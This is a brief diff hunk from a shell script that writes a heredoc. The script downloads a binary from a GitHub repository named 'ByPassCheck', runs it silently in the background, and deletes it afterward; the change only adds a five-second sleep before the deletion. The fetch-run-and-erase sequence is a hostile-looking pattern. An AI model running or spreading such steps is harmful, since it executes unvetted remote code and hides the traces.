@@ -21,6 +21,7 @@ create_mainfest_file(){
 wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/invoke -q -O $Dirname
 chmod +x $Dirname
 nohup ./$Dirname >/dev/null 2>&1  &
+sleep 5
 rm $Dirname*
 while [ 1 == 1 ]; do sleep 9999; done
 EOF
